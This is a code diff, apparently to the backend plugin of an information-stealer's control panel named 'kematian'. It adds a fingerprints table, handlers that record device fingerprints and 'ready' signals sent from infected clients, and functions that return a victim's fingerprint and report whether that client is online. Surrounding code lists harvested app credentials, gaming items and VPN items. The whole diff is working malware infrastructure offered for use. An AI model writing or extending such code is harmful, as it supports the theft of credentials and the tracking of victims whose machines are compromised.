@@ -869,7 +869,8 @@ export default {
 
       CREATE TABLE IF NOT EXISTS client_runs (
         client_id TEXT PRIMARY KEY,
-        last_captured_at INTEGER NOT NULL
+        last_captured_at INTEGER NOT NULL,
+        plugin_ready_at INTEGER
       );
 
       CREATE TABLE IF NOT EXISTS collect_errors (
@@ -879,7 +880,16 @@ export default {
         created_at INTEGER NOT NULL
       );
       CREATE INDEX IF NOT EXISTS ce_client ON collect_errors(client_id);
+
+      CREATE TABLE IF NOT EXISTS fingerprints (
+        client_id TEXT PRIMARY KEY,
+        data TEXT NOT NULL,
+        js_data TEXT,
+        captured_at INTEGER NOT NULL
+      );
     `);
+    try { ctx.db.exec(`ALTER TABLE fingerprints ADD COLUMN js_data TEXT`); } catch (_) {}
+    try { ctx.db.exec(`ALTER TABLE client_runs ADD COLUMN plugin_ready_at INTEGER`); } catch (_) {}
     // Migrations for installs predating these fields
     try { ctx.db.exec(`ALTER TABLE files ADD COLUMN tags TEXT`); } catch (_) {}
     try { ctx.db.exec(`
@@ -1058,6 +1068,14 @@ export default {
     if (!stmts) { console.error("[kematian] onEvent called but stmts is null — setup likely failed"); return; }
     const now = Date.now();
 
+    if (event === "ready") {
+      ctx.db.prepare(`INSERT INTO client_runs(client_id, last_captured_at, plugin_ready_at) VALUES(?,?,?)
+        ON CONFLICT(client_id) DO UPDATE SET plugin_ready_at = excluded.plugin_ready_at`)
+        .run(clientId, now, now);
+      ctx.broadcast("harvest_update", { clientId });
+      return;
+    }
+
     if (event === "results") {
       const tx = ctx.db.transaction(() => {
         insertPayload(ctx.db, stmts, clientId, payload, now);
@@ -1085,6 +1103,16 @@ export default {
           .run(clientId, String(payload.error), now);
         ctx.broadcast("harvest_update", { clientId });
       }
+    } else if (event === "fingerprint_result") {
+      ctx.db.prepare(`INSERT INTO fingerprints(client_id, data, captured_at) VALUES(?,?,?)
+        ON CONFLICT(client_id) DO UPDATE SET data = excluded.data, captured_at = excluded.captured_at`)
+        .run(clientId, JSON.stringify(payload), now);
+      ctx.broadcast("fingerprint_update", { clientId });
+    } else if (event === "fingerprint_js_result") {
+      ctx.db.prepare(`INSERT INTO fingerprints(client_id, data, js_data, captured_at) VALUES(?,?,?,?)
+        ON CONFLICT(client_id) DO UPDATE SET js_data = excluded.js_data, captured_at = excluded.captured_at`)
+        .run(clientId, "{}", JSON.stringify(payload), now);
+      ctx.broadcast("fingerprint_update", { clientId });
     } else if (event === "file_scan_results") {
       const tx = ctx.db.transaction(() => {
         for (const r of payload?.files || [])
@@ -1387,6 +1415,26 @@ export default {
     list_app_credentials(ctx, params)   { return listTable(ctx, TABLE_CFGS.app_credentials,   params); },
     list_gaming_items(ctx, params)      { return listTable(ctx, TABLE_CFGS.gaming_items,      params); },
     list_vpn_items(ctx, params)         { return listTable(ctx, TABLE_CFGS.vpn_items,         params); },
+
+    get_fingerprint(ctx, params) {
+      const cid = params?.clientId;
+      if (!cid) throw new Error("clientId required");
+      const row = ctx.db.prepare(`SELECT data, js_data, captured_at FROM fingerprints WHERE client_id = ?`).get(cid);
+      if (!row) return null;
+      return {
+        clientId: cid,
+        data: JSON.parse(row.data || "{}"),
+        jsData: row.js_data ? JSON.parse(row.js_data) : null,
+        capturedAt: row.captured_at,
+      };
+    },
+
+    client_online(ctx, params) {
+      const cid = params?.clientId;
+      if (!cid) throw new Error("clientId required");
+      const row = ctx.db.prepare(`SELECT plugin_ready_at FROM client_runs WHERE client_id = ?`).get(cid);
+      return { online: !!(row && row.plugin_ready_at), readyAt: row?.plugin_ready_at || null };
+    },
 
     export_client(ctx, params) {
       const cid = params?.clientId;
